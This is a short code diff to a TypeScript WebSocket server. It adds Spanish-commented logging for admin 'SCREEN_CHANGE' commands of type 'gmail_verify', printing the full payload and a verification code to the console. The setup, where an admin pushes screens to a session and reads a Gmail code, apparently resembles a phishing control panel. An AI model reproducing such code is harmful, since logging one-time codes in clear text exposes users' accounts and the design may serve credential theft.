@@ -1027,9 +1027,23 @@ export async function registerRoutes(app: Express): Promise<Server> {
         // Handle screen change request from admin
         if (data.type === 'SCREEN_CHANGE') {
           try {
+            // Verificamos si es el tipo gmail_verify para tener especial cuidado con el código
+            if (data.data.tipo && data.data.tipo.includes('gmail_verify')) {
+              console.log('⚠️ [WebSocket] Procesando comando GMAIL_VERIFY con datos:', JSON.stringify(data.data));
+              
+              // Nos aseguramos de que el código no se modifique durante la validación
+              const codigoOriginal = data.data.codigo || '';
+              console.log('🔑 [WebSocket] Código original recibido:', codigoOriginal);
+            }
+            
             // Validate the data
             const validatedData = screenChangeSchema.parse(data.data);
             const { sessionId, tipo } = validatedData;
+
+            // Si es gmail_verify, confirmamos que el código sea el mismo que se recibió
+            if (tipo.includes('gmail_verify')) {
+              console.log('✅ [WebSocket] Datos validados para GMAIL_VERIFY:', JSON.stringify(validatedData));
+            }
 
             // Find the target client
             const client = clients.get(sessionId);
